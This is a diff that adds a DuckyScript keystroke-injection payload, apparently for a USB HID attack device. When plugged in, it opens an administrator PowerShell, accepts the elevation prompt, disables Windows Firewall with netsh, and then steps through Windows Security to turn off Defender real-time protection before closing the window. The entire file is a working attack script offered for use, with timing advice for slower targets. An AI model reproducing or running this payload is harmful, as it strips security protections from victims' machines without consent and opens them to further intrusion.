@@ -1,0 +1,69 @@
+REM ------------------------------------
+REM Author: P-ict0 (https://github.com/P-ict0)
+REM ------------------------------------
+REM NOTE: For slower computers, increase DEFAULT_DELAY
+REM This script:
+REM 1 Opens PowerShell (Admin)
+REM 2 Disables Windows Firewall
+REM 3 Opens Windows Security settings
+REM 4 Navigates and disables Real time Protection
+REM 5 Closes everything
+REM ------------------------------------
+
+REM Adjust timing if needed
+DEFAULT_DELAY 200
+
+REM ---------- Open PowerShell as Admin ----------
+REM Press Windows Key + X
+GUI x
+DELAY 20
+STRING a
+DELAY 500
+LEFTARROW
+ENTER
+DELAY 900
+
+REM ---------- Disable Windows Firewall ----------
+STRING netsh advfirewall set currentprofile state off
+ENTER
+DELAY 20
+STRING exit
+ENTER
+DELAY 20
+
+REM ---------- Open Windows Security ----------
+REM Open the Start Menu
+CONTROL ESCAPE
+DELAY 100
+STRING Windows Security
+ENTER
+DELAY 400
+TAB
+DELAY 5
+TAB
+DELAY 5
+TAB
+DELAY 5
+TAB
+DELAY 5
+ENTER
+DELAY 200
+TAB
+DELAY 5
+TAB
+DELAY 5
+TAB
+DELAY 5
+TAB
+DELAY 5
+ENTER
+DELAY 500
+SPACE
+DELAY 500
+LEFTARROW
+DELAY 50
+ENTER
+DELAY 100
+
+REM ---------- Close window ----------
+ALT F4
